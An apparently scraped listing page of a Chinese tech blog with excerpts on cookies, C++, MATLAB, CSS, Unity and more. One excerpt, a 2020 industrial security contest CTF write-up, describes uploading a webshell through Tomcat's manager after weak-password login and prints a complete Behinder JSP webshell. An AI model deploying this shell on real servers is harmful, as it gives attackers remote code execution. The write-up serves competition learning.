&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;Configuration&gt; &lt;Appenders&gt; &lt;Console name="STDOUT" target="SYSTEM_OUT"&gt; &lt;PatternLayout pattern="%d %-5p [%t] %C{2} (%F:%L) - %m%n"/&gt; &lt;/Console&gt; &lt;RollingFile name="RollingFile" fileName="logs/strutslog1.log" filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz"&gt; &lt;PatternLayout&gt; &lt;Pattern&gt;%d{MM-dd-yyyy} %p %c{1.} [%t] -%M-%L- %m%n&lt;/Pattern&gt; &lt;/PatternLayout&gt; &lt;Policies&gt; &lt;TimeBasedTriggeringPolicy /&gt; &lt;SizeBasedTriggeringPolicy size="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/320aa83b4f4752aee12bfc2ee70c5c37/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a553c8f8fbd5628fc99db51dc2c65fc/" rel="bookmark">
			day23 - Cookie、本地存储localStorage以及XSS攻击
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Cookie 1.概念： Cookie是浏览器提供的一个存储数据的空间。 Cookie又叫会话跟踪技术，是由Web服务器保存在用户浏览器上的小文本文件，它可以包含相关用户的信息。无论何时用户链接到服务器，Web站点都可以访问Cookie信息 。 比如：自动登录、记住用户名，记住一些和用户相关的信息等。 2.特点： 1.cookie必须是分域名存储的，也就是说在当前域名下设置的cookie只能在当前域名下获取
2. cookie是有时效性的，默认是会话级别，浏览器关闭就失效
3. cookie分路径的，当前路径下设置的cookie只能在当前路径下使用
4. 储存在浏览器上，不是特别安全 - 不要存储重要数据
5. cookie在浏览器上存储的大小是有限制的 - 通常大小在4kb之内，数量150条左右
6. 禁用cookie后，无法正常注册登录
7. cookie是与浏览器相关的，不同浏览器之间所保存的cookie也是不能互相访问的；
8. cookie可以被删除。因为每个cookie都是硬盘上的一个文件；
9. cookie安全性不够高-xss攻击
3.cookie的操作： （1）存储cookie:
①给document的cookie属性进行赋值 document.cookie = '键=值'; cookie存储是按照键值对的形式存储的；键值相同会覆盖。 这个数据要是一直存在在浏览器中的话，浏览器的内存会崩溃，所以cookie也会有消失的时候。会话级别(Session) - 浏览器关闭的时候就失效了。 cookie可以在当前页面设置，别的页面访问，可以跨文件访问的 - 因为存储在同一个浏览器上。 ②设置cookie的有效期 document.cookie = '键=值；expires=失效时间'; cookie识别的时间是格林威治时间，而我们获取到的时间是东8区的时间，所以需要减去8个小时，才是当前时间。 cookie有路径的限制：在当前文件中设置的cookie，在当前文件夹中可以使用，在别的文件夹中无法使用。 ③设置cookie的时候可以设置路径 document.cookie = '键=值；expires=失效时间；path=/'; 这里的"/"在服务器中代表根目录 （2）获取cookie：
document.cookie cookie如果不存在，输出undefined cookie必须是分域名存储的，也就是说在当前域名下设置的cookie只能在当前域名下获取。 （3）删除cookie
就是将cookie的有效期设置到上一秒 var date = new Date(+new Date()-1000*60*60*8-1); // 当前时间的上一秒 document.cookie = 'name=zhangsan;expires='+date; 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a553c8f8fbd5628fc99db51dc2c65fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c65149ea2107afc8cd56dbf3ced79b5/" rel="bookmark">
			c&#43;&#43;编程提升（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在阅读&lt;&lt;effective C++&gt;&gt;这本书， 这本书在我刚开始学习编程的时候， 我就听过这本书的大名。 不管在任何论坛和前辈的推荐中， 关于进阶C++， 总会有这本书的影子。
本章浅谈下条款1到条款4。
很好奇为什么这本书要以条款为标题。但是确实新颖， 分层很清晰。也算是这本书一大特色，挺喜欢的。
条款1到条款4重点是在介绍const的重要性， 从各个方面引入，比较， 说const各大优点，甚至在设计的使用的优点等。
1、explicit关键字 我们来看一个例子：
#include&lt;iostream&gt; using namespace std; class A { public:	A(int a = 0, int b = 0) :_a(a) ,_b(b) { } void Print() { cout &lt;&lt; _a &lt;&lt; ' ' &lt;&lt; _b &lt;&lt; endl; } private: int _a; int _b; }; void fun(A object) { object.Print(); } int main() { A a; fun(10); return 0; } 执行结果： 10 0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c65149ea2107afc8cd56dbf3ced79b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8ac216a845ac9936dc5b7987f659223/" rel="bookmark">
			Excel表格数据该怎么读取和写入之——xlsread函数和xlswrite函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Excel表格数据该怎么读取和写入之——xlsread函数和xlswrite函数 excel作为一种数据处理和管理软件，在使用MATLAB时，经常需要对Excel进行读取和写入数据操作。
新人小白，欢迎大神指点
读取函数——xlsread 读取数字 在利用matlab进行数据处理时，读取Excel中的数字是最为常见的操作。直接给方式：
数据如图：
图片：
读取方式：matlabValueMatrix = xlsread('文件地址+文件名'， ‘工作表’) 例如：matlabValueMatrix = xlsread('C:\Users\Administrator\Desktop\111\Breast Cancer Wisconsin (Diagnostic)\breast-cancer-wisconsin.xls', 'sheet2') 读取结果如图：
字母读取 如图：
利用上述读取数字的方式，读取结果如下图：
图中显示第二列的字母并没有显示出来，而是显示NaN。应该使用的读入方式：
[dataBaseNum, dataBaseChar, dataBaseTxt] = xlsread('文件地址+文件名称', ‘工作表’) 例子：[dataBaseNum, dataBaseChar, dataBaseTxt] = xlsread('C:\Users\Administrator\Desktop\111\Breast Cancer Wisconsin (Diagnostic)\wdbc.xls', ‘sheet1’) 系统默认读取的sheet1的数据，当肚脐取数据在sheet1中时，可以不指明工作表。
读取结果如下：
dataBaseNum中存放的是Excel中的单纯数字部分：
dataBaseChar中存放的是Excel中的单纯字符（字母）部分：
dataBaseTxt中存放的是Excel中的所有数据部分：
写入函数——xlswrite 写入函数xlswrite函数的使用比较单一，较为常用的使用方式如下：
具体格式：xlswrite(‘文件地址+文件名称’, 需要保存的矩阵名称, ‘工作表’)
例子：xlswrite(‘C:\Users\Administrator\Desktop\111\Breast Cancer Wisconsin (Diagnostic)\wdbc.xls’, dataBaseNumEnd, ‘sheet2’)
探索篇——cell数据处理 如图所示，dataBaseChar和dataBaseTxt中的数据是以cell形式存储的，对cell数据的处理也是关键一步。小白我查阅了好多资料，并且进行了实验，适合我这种新手的解决方法，进行共享如下：
方法比较蠢，不过可以处理
clc clear all [dataBaseNum, dataBaseChar, dataBaseTxt] = xlsread('C:\Users\Administrator\Desktop\111\Breast Cancer Wisconsin (Diagnostic)\wdbc.xls'); dataBaseCharTemp = dataBaseChar; tempIndex_one_to_ten = strcmp(dataBaseChar(:), 'M'); temp_M = find(tempIndex_one_to_ten == 1); tempRow = size(temp_M, 1); for i = 1 : tempRow dataBaseCharTemp{temp_M(i)} = 1; end tempIndex_eleven_to_end = strcmp(dataBaseChar(:), 'B'); temp_N = find(tempIndex_eleven_to_end == 1); tempRow = size(temp_N, 1); for i = 1 : tempRow dataBaseCharTemp{temp_N(i)} = 0; end dataBaseCharTempNum = cell2mat(dataBaseCharTemp); xlswrite('C:\Users\Administrator\Desktop\111\Breast Cancer Wisconsin (Diagnostic)\wdbc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8ac216a845ac9936dc5b7987f659223/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b9cef8aa0e5105b97c7d3588cb28bfe/" rel="bookmark">
			2020工业安全技能大赛——应急&amp;电力专场部分WriteUp
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文：
Pdsdt’s Blog
平台登陆 需要我们连接VPN才能进入内网，登陆用户名和密码需要在平台进行申请，用的接入设备是深信服的软件，总体连接还是比较稳定的
传输模式改为TCP比较稳定，主办方提供了具体的网段10.10.1.X，我们可以利用工具进行IP和服务探测，这里我使用的Advance_IP_Scanner
电力专场 互联网大区题目一 扫描内网发现10.10.1.55的靶机开启WEB服务
访问一下发现是Jsp搭建的博客，懒得手动测试了，直接上了扫描器
发现了存在弱口令登陆
在manager/html目录下，存在文件上传的点，我们可以构造我们的WEBSHELL压缩成WAR包上传，之后tomcat会服务会自动解包并将我们的WEBSHELL解析
访问发现有其他人上马的痕迹，省时间直接骑别人的了
发现在ROOT目录下存在f1ag.txt，直接下载查看即可获取flag
互联网大区题目二 与上一道题目是一个环境，不过提示我们在WEB环境仍然存在一个flag，为了方便期间上传我们的冰蝎马进行链接
&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt; 后来找了WEB源码也没找到，想到了去数据库查找，先把源码都给Down了下来，找一下数据库的配置文件
使用冰蝎进行数据库连接，还是没有找到flag，之后找了后台登陆的用户名和密码
username= admin md5(password)= ee955f62cb93483a635817b9f263439e # cmd5解出来的密码和数据库连接密码一样shenmiliu 登陆后台还是没有发现flag，想问问其他师傅们这个题目的flag到底是什么东西
应急专场 这个题目需要我们登陆远程桌面进行获取，远程桌面是WIN7的系统，想到了用户名应该为Administrator，利用主办方给我们提供的主机密码成功登陆
不过顺利都是暂时的，后面我还遇到了，密码被修改、协议不正确、服务被关闭、主机IP变化等问题，等到六点之后内网的服务才趋于稳定…
解勒索病毒 桌面给了一个flag.txt.vlojw的文件，我们需要解密一下这个文件，在主机里进行信息收集，可以在admin的桌面下找到VLOJW-DECRYPT.txt,打开后发现勒索病毒为GANDCRAB V5.1
通过查阅资料可以知道该病毒已经有了解密软件
https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=874030&amp;highlight=GANDCRAB
直接使用软件进行扫描修复即可
要注意的是，软件需要很长的时间，等着就完事了，解密成功后，就会在桌面下出现flag.txt
病毒分析3 分析从远程获取到的文件，分析17-010补丁文件
从远程dump部分文件下来。
题目寻找为MSF生成的马的ip，这里直接去运行文件，抓包分析即可。
运行17-010补丁并且抓包
rdp攻击日志分析 参考文章：
https://blog.csdn.net/m0_37552052/article/details/82894963
事件管理器中找到TerminalServices-RemoteConnectionManager
选择日志进程号1149找ip
浏览器取证 仍然是注册表里找信息
这几个题目主要都是考察注册表的熟悉程度
内存取证分析 全场最离谱的题目，没有之一，给了一个加密的RAR让我们破解，队友有尝试爆破的，后来七点多的时候，一个队友试了一下主办方提供的远程桌面登陆的密码，结果打开了…
赛后 希望下两场的环境能够稳定一些，能够多一点赛事体验感
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9026b7ba965f8af1e8352659e2af735b/" rel="bookmark">
			已知前序遍历序列和后序遍历序列，不能确定一棵二叉树！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【结论】： 已知前序遍历序列和中序遍历序列，可以唯一确定一棵二叉树
已知后序遍历序列和中序遍历序列，可以唯一确定一棵二叉树
但是已知前序遍历序列和后序遍历序列，是不能确定一棵二叉树的
即：没有中序遍历序列的情况下是无法确定一颗二叉树的
【例题】下面例子通过前序遍历和中序遍历确定唯一的一棵二叉树。
前序遍历：EACBDGF
中序遍历：ABCDEFG
1、首先根据前序遍历找出根节点是E，然后根据中序遍历可以知道ABCD是E的左子树，FG是E的右子树。
2、然后根据左子树的先序：ACBD，中序：ABCD，确定A为根结点，无左子树，右子树为BCD
3、右子树为BCD，先序：CBD，中序：BCD，确定C为根结点，B为左子树，右子树为D
4、右子树为GF，先序：GF，中序：FG，确定G为根结点，无右子树，左子树为F
5、最终的二叉树为：
后序遍历序列和中序遍历序列，可以唯一确定一棵二叉树和前中很相似，先根据后序遍历的最后一个元素确定根结点，然后通过中序遍历分为左右子树，再在子树确定根结点，以此类推。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebb2ce21ca6e7ae3477445c7f67a3c92/" rel="bookmark">
			ArcGIS Desktop各个安装包功能介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ArcGIS Desktop 包括以下组件： ArcGIS Desktop - Basic、Standard 或 Advanced 版本的 ArcGIS Desktop 安装程序，以及可选的 ArcGIS 扩展模块产品。
ArcGIS Desktop Background Geoprocessing（64 位）- 64 位后台地理处理安装程序。
Database Server (Desktop) - 用于安装 SQL Server Express 实例以存储地理数据库。
ArcGIS License Manager 2018.0（Windows 和 Linux）- 运行浮动版许可的 ArcGIS Desktop 10.6.1 和 ArcGIS Engine 10.6.1 需要此版本。也支持所有其他 ArcGIS 10.x 浮动版版本。
ArcReader - 允许用户查看、浏览和打印地图及 globe 的 Desktop 制图应用程序。
ArcGIS Tutorial Data for Desktop - 用于 ArcGIS Desktop 教程的数据。
ArcGIS Coordinate Systems Data - 包含 GEOCON 变换方法所需要的数据文件以及美国（VERTCON 和 GEOID12B）和世界 (EGM2008) 的垂直变换文件。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ebb2ce21ca6e7ae3477445c7f67a3c92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c97e4da9a9da1221a1966551fd9a44e/" rel="bookmark">
			Lombok坑，set,get方法不区分大小写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Lombok坑，set,get方法不区分大小写
解决办法：
自己手动生成get,set方法
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a70f9e8858e3ed682e8cb31536f6148b/" rel="bookmark">
			深入解析CSS笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		层叠、优先级和继承 可以被继承的属性：
与文本相关的属性
color、font、font分解属性、line-height、letter-spacing、text-aligh、text-indent、text-transform、white-space、word-spacing
列表属性
list-style、list-style-type、list-style-position、list-style-image
表格边框属性
border-collapse、border-spacing
第二章 相对单位 :root{ font-size: 0.75em; } @media only screen and (min-width: 800px) { :root{ font-size: 0.875em; } } @media only screen and (min-width: 1200px){ :root{ font-size: 1em; } } 屏幕越大，字体越大，在开发的时候尽量使用如下规则：
font-size使用rem，border使用绝对值px，其他属性使用em单位
视口相对单位 vw：视口宽度的1/100
vh：视口高度的1/100
vmin：视口宽度和高度较小的一方1/100
vmax：视口宽度和高度较大的一方1/100
使用vw和calc也可以实现达到定义字号的目的，并且平滑过渡
:root { font-size: calc(0.5em + 1vw); } CSS变量 CSS原生已经支持了变量，使用方法
:root { font-size: calc(0.5em + 1vw); --my-color:red } h1 { color: var(--my-color); } 变量也可以被继承，也可以重写，在父元素上重写
第三章 盒模型 目前普遍做法是在项目开始将所有容器盒模型设置为border-box
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a70f9e8858e3ed682e8cb31536f6148b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/493019e5a6c149f3a217c25aed77472a/" rel="bookmark">
			TwinCAT3 PLC多轴编程的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		测试共有13个轴，前10个轴包含基本功能，后3个轴包含独有功能。
方法一 定义每个轴的基本功能，包括上电、下电、走相对、走绝对、读位置、读状态、复位、停止等。
在Axis_Base_PTP中定义变量：
FUNCTION_BLOCK Axis_Base_PTP VAR REF: AXIS_REF; mcMoveRela: MC_MoveRelative; mcPower: MC_Power; mcStop: MC_Stop; mcMoveAbs: MC_MoveAbsolute; mcReset: MC_Reset; mcReadPosition: MC_ReadActualPosition; mcReadStatus: MC_ReadStatus; mcHalt: MC_Halt; AxisPara:ST_AxisPara; END_VAR M_PowerOn方法代码：
METHOD M_PowerOn : BOOL VAR_INPUT bExcute : BOOL; END_VAR VAR_OUTPUT bStatus : BOOL; (* B *) bBusy : BOOL; (* V *) bActive : BOOL; (* V *) bError : BOOL; (* B *) dErrorID : UDINT; (* E *) END_VAR IF bExcute THEN mcPower( Axis:= REF, Enable:= TRUE, Enable_Positive:= TRUE, Enable_Negative:= TRUE, Override:= AxisPara.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/493019e5a6c149f3a217c25aed77472a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bb02ea5aa7ebe0715cb4d1c4c46ff3e/" rel="bookmark">
			iOS14 隐私适配及部分解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在刚刚结束的线上 WWDC 2020 发布会上苹果向我们展示了新的 iOS14 系统。iOS14 的适配，很重要的一环就集中在用户隐私和安全方面。
在 iOS13 及以前，当用户首次访问应用程序时，会被要求开放大量权限，比如相册、定位、联系人，实际上该应用可能仅仅需要一个选择图片功能，却被要求开放整个照片库的权限，这确实是不合理的。对于相册，在 iOS14 中引入了 “LimitedPhotos Library” 的概念，用户可以授予应用访问其一部分的照片，对于应用来说，仅能读取到用户选择让应用来读取的照片，让我们看到了 Apple 对于用户隐私的尊重。这仅仅是一部分，在iOS14 中，可以看到诸多类似的保护用户隐私的措施，也需要我们升级适配。
最近在调研 iOS14的适配方案，本文主要分享一下 iOS14 上对于隐私授权的变更和部分适配方案，欢迎补充指正。
适配点
▐ 相册 ✎ iOS14 新增了“Limited Photo Library Access” 模式，在授权弹窗中增加了 Select Photo 选项。用户可以在 App 请求调用相册时选择部分照片让 App 读取。从 App 的视⻆来看，你的相册里就只有这几张照片，App 无法得知其它照片的存在。
✎ iOS14 中当用户选择
“PHAuthorizationStatusLimited” 时，如果未进行适配，有可能会在每次触发相册功能时都进行弹窗询问用户是否需要修改照片权限。
✎ 对于这种情况可通过在 Info.plist 中设置 “PHPhotoLibraryPreventAutomaticLimitedAccessAlert”的值为 YES 来阻止该弹窗反复弹出，并且可通过下面这个 API 来主动控制何时弹出PHPickerViewController 进行照片选择。
[[PHPhotoLibrary sharedPhotoLibrary] presentLimitedLibraryPickerFromViewController:self]; ✎ 在 iOS14 中官方推荐使用 PHPicker 来替代原 API 进行图片选择。PHPicker 为独立进程，会在视图最顶层进行展示，应用内无法对其进行截图也无法直接访问到其内的数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bb02ea5aa7ebe0715cb4d1c4c46ff3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e940fcee0098dd751a0d52c85101819c/" rel="bookmark">
			数据结构与算法——列表的实现、排序与遍历（C&#43;&#43;）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 列表实现1.1 ListNode节点结构体1.2 List类1.3 主程序 2 列表三大排序方法2.1 插入排序2.2 选择排序2.3 归并排序 3 列表遍历4 总结 1 列表实现 1.1 ListNode节点结构体 构建列表的前提是建造一个列表节点的结构体，这个结构体表示了列表的最小单元。ListNode结构体一般包括的成员有数据，前驱与后继。
typedef int Rank; // 秩 #define ListNodePosi(T) ListNode&lt;T&gt;* //列表节点位置 template &lt;typename T&gt; struct ListNode{ //成员 T data; ListNodePosi(T) pred; ListNodePosi(T) succ; //构造函数 ListNode() {}; ListNode( T e, ListNodePosi(T) p = NULL, ListNodePosi(T) s =NULL) :data( e ), pred( p ), succ ( s ){} //操作接口 ListNodePosi(T) insertAsPred ( T const&amp; e); ListNodePosi(T) insertAsSucc ( T const&amp; e); }; 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e940fcee0098dd751a0d52c85101819c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f4471784061ace80c4e5787cdb3c522/" rel="bookmark">
			guacamole SSH、TELNET建议配置中文无衬线等宽字体Noto Sans Mono CJK SC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LINUX默认zh_CN.utf8 时英文大小不一，可以通过改为en_US.utf8使字体正常
localectl set-locale LANG=en_US.utf8
guacamole SSH、TELNET建议配置中午无衬线等宽字体Noto Sans Mono CJK SC
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62940473f469bbfe66e46107b8a77e98/" rel="bookmark">
			软考是什么-有什么用-怎么报名-考试内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		西瓜、饮料、小零食、下午茶、游戏、休闲，这是不是你梦寐以求的生活方式？又到酷暑季节了，是不是感觉走在路上都烫脚，坐在电脑前当双手敲代码到眼冒金星的时候，是不是很想对着屏幕大吼：我！不！... ...
趁青春挥洒汗水，让短暂的人生来一次继高考后的又一次燃烧——参加软考！
软考是什么？
软考是指计算机技术与软件专业技术资格（水平）考试。考试分为 5 个专业类别，并在各专业类别中分设了高、中、初级专业资格考试，囊括了共 28 个资格的考核。 初级资格和中级资格主要考基础知识和应用技术2个科目.高级资格主要考综合知识、案例分析和论文3个科目。
软考合格有什么用？
通过考试后，由国家人事局颁发合格证书，同时也表明你已具备从事相应专业岗位工作的水平和能力，用人单位可以根据工作需要从获得证书的人员中择优聘任相应专业技术职务（技术员、助理工程师、工程师、高级工程师）。
同样的岗位招聘中，企业会优先录用持证上岗的你，竞争优势很明显哦
企业申报某些国家待遇补贴时，需要有职称的要求，这时你就格外突出了
持证上岗，备受大厂青睐！例如HUAWEI
如果想去一线城市打拼，还可以持证落户哦
当然，企业不是白用你的证，毕竟辛苦考来的，每个月会有补贴哦！
软考有哪些科目？
软考有初、中、高级三个级别，初、中级考两科，高级要考三科，算是有一定难度的呢！具我的经验呢（高级），上午基础知识也就是单选题，两小时很长啦，很快就做完了！案例分析，我当时是时间确实不够，差点没做完，很紧张，题也很灵活；还有就是论文，险过47分，多靠背和项目管理中的理论变实际应用吧，总之复习期间很辛苦的。
要考过有哪些要求？
软考每科总分75分，45分及以上为合格，但是软考不像驾照，可以一科一科的考，哪科不过就重考哪科。而是一次性所有科目都要通过才算合格，所以，一定要全面复习，多做真题，提高通过概率。
哪些人群可以参加考试？
软考是没有什么考试限制的，理论上只要你年满18岁周就可以参加考试，也没有工作经验或者学历的要求，所以只要你想考都可以。软考科目这么多，我该考哪一个呢？我只能说每个科目的技术方式不同，就以我为例，我不是计算机专业的，但是一直在互联网公司做产品经理，对开发技术也只能是理论上的了解，我选择的是高级里的信息系统项目管理师，因为我不懂技术，但对整体的项目管理比较了解，而且也证实了项目管理师涉及的技术不深入，但面和广。如果你是技术型人才，就可以从网络设计师或者架构设计师等方向去考虑，或者是中级里的一些其他专业方向。
好了，接下来要划重点了
重点一、报名方式和时间
软考每年都有两次考试，一般在5月和11月进行，当然最近十年才稳定哈，2020年上半年的考试因为疫情影响，延期到了11月进行，已经报名5月的你是不是在偷笑呢，别松懈，还有很多章节等你复习呢！目前为止，各地区的报名时间还未全部开放，具体参照下表：对了，报名网址：http://bm.ruankao.org.cn/ （全国计算机技术与软件专业技术资格（水平）考试网上报名平台）一张寸照哦，报名成功以后记得赶紧缴费180元的样子，过期就报名失败了。
重点二、如何备考
关于备考，不输给高考时的复习量吧，我是2019年11月参加考试的，从7月初开始就已经购买了第3版的教材和复习题，不得不说教材足足有8cm那么厚，可要命了，而且还在上班，晚上回家还是带几个月的宝宝，辛苦死本宝宝了。坐个地铁上下班都在手机上刷题，哎，那几个月的日子真是很痛苦的。所以，本宝宝总结了一下，4个月备考时间对上班簇来说刚刚好吧，
备考方式一、看教材，笔记抄重点，到考前3天只背重点；备考方式二、手机刷题，利用好你所有的碎片时间，多做练习题；备考方式三、历年真题是非常重要的，因为每年都会有2-5个一模一样的题，还有2-5个类似的题，不做真题这至少5分不好拿哦；备考方式四、手写论文五篇并背诵（高级的哈，而且是五篇不同领域的哦），因为现场发挥写作要达到3000字且能通过是很困难的，一定要提前准备，至少论文的前后大约1000字可以通用，中间的内容根据领域来。 这里推荐一个手机刷题的渠道，亿辰空间，专做软考刷题的，目前是免费使用，用户体验和题库都很不错
微信公众号搜索亿辰空间，关注即可！
备考吧-大宝宝们
好了，说了这么多，本宝宝要去带小宝宝了，有什么问题随时给我留言，当然我不会及时回复啦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31023d7639294ce332996d797d6252e0/" rel="bookmark">
			在Unity3D中控制动画播放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用Unity3D也算是好久了，但是每次做项目总还是能学到新的东西。这次做一个TPS的项目就遇到了这样一个问题，如何同时在上下半身播放不同的动画？解决方法其实是很简单，但由于对于动画资源的了解不足导致问题不断，最后是彻彻底底的研究了一遍Unity3D的动画系统（Legacy），虽然4.0出了新的动画控制系统，使用了一下功能相比原来确实强大不少，但还是将这次对于原先的动画系统的学习总结记录下来，毕竟这些动画的概念与策略是通用的，而且因为4.0在mac上目前貌似还没有破解所以项目还是得在3.5上做。相信对于深入理解新的动画系统也会很有帮助。
一、Unity3D动画系统相关类 1.1 AnimationClip AnimationClip是Unity3D中播放动画的最基本对象，通过FBX导入的各个动画对象其实就是一个AnimationClip。这个类已关键帧的形式记录了骨骼关节在各个时间节点上的位置、旋转信息，根据帧频率frameRate结合播放模式wrapMode通过插值计算即可播放出连续的骨骼动画。
1.2 AnimationState 每个AnimationState包含了一个AnimationClip，并记录这个动画片段的一些播放控制属性，实际上是一个AnimationClip的包装器。
其中比较重要的参数有layer,weight, enabled, speed, blendMode这几项。这些参数的具体含义将在自定义混合动画控制中详细解释，在简单的动画控制时并不需要对AnimationState进行直接操作。
1.3 Animation Animation是Unity3D的动画播放控制组件，包含了一系列的AnimationState对象，提供各种动画播放及控制方法。常用方法有Play(), CrossFade(), Stop()。在脚本中通过animation即可直接引用同一物体上的Animation控件。
二、简单动画播放控制 所谓简单动画播放控制就是同一时间只有一个动作，比如Standard Assets中的那个水管工，静止idle，走walk，跑run，跳跃jump，攻击attack这些动作都是全身动作，同一时间只应该做一种动作，只有在动作切换时需要将两种切换动作进行混合以达到平滑过渡的效果，以上的操作使用Animation提供的CrossFade()方法即可达到。无论是CrossFade还是Play理论上都只需要在切换动画时调用一次即可，当然重复的调用并不会影响动画的播放，当Unity3D检测到当前播放的动画与函数调用使用的动画一样后会忽略该次调用。
三、自定义混合动画控制 3.1 多动画同时播放的需求 在大多数情况下简单的动画播放控制已经足够，然而当游戏变得复杂时，单动画播放带来的问题就是美术工作量的急剧增加。
最为典型的就是第三人称射击（动作）游戏，通常来说游戏中的人物会有各种上身动作如瞄准、射击、换子弹等，而下身则对应站立，行走（通常还是四个方向的行走动作）。这时候如果只能播放一个动作的话就需要美工制作大量的动作（站立瞄准、站立射击、跑步瞄准、跑步射击等等），其工作量可想而知。显然，最为效率的方式是美工分别做出上半身以及下半身的动作，然后由程序根据游戏角色的操作将两者动作混合起来同时播放。而这就涉及到了多动画同时播放的需求。此时简单的CrossFade()方法已经不能满足了，我们需要通过AnimationState来对动画播放进行自定义的控制。
3.2 使用AnimationState控制动画播放 Unity3D的动画播放实际上都是通过AnimationState来进行控制的，Animation组件中提供的CrossFade,Play等方法其实就是将一系列对AnimationState参数进行设置的操作进行了封装。
其中主要相关的参数有四个：
layer: 该动画片段(AnimationClip)所在的播放层次。
weight: 该动画片段在动画混合中所占的权重(0~1)
enable: 该动画片段是否进行播放
blendMode: 混合方式，有两种Blend和Additive
默认初始化情况下Animation组件中的全部AnimationState的layer=0,weight=0, enable=false。Animation组件默认播放的AnimationState的layer=0, weight=1, enable=true。
一、Unity3D动画播放策略
Unity3D在进行动画播放时按照下面的策略进行：
1.找到最高一层的全部AnimationState
2.将其中enable为true且weight &gt; 0的AnimationState中的clip加入混合池(虚构的一个概念)
3.如果当前混合池中全部blendMode为Blend的clip的权重相加少于1，则找到下一层的全部AnimationState。重复2.
4.对混合池中的全部clip进行混合操作，生成最终的动作。
在进行最终混合时所有clip的实际权重会进行归一化处理，即相加为1，处理时根据blendMode的不同结果也会有所差异，下面的例子会进一步说明。
二、使用AnimationState控制播放的实例
举几个实际的例子对Unity3D的动画混合策略进行说明。对于AnimationState的设置全部放在Start或Awake中进行。并且注意把Animation组件中的默认播放动画设为None，取消选中Player Automatically，原因正如前文所述，默认播放的AnimationState参数初始值与其他State不同，会对实验造成影响。
1. 同一层动画的混合播放
AnimationState right= animation[“run_right”];
AnimationState idle= animation[“idle”];
right.layer = 1;right.weight = 1; right.enable = true;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31023d7639294ce332996d797d6252e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5df94fd35b667e03fff9fb5859503b4/" rel="bookmark">
			permission denied, access ‘/usr/local/lib/node_modules‘  node_modules没有写权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
